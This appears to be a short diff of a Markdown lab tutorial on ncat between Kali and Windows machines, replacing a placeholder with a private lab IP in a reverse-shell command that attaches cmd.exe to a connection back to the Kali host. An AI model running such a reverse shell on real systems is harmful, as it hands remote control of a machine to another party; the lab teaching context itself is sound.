@@ -101,7 +101,7 @@ Kali listens on port 4444 and waits for a connection from Windows.
 
 3. **Windows – reverse shell to Kali**
 ```bash
-ncat -nv <IP_Kali> 4444 -e cmd.exe
+ncat -nv 192.168.56.11 4444 -e cmd.exe
 ```
 Windows connects to Kali, and the cmd.exe process is attached to that network channel.
 
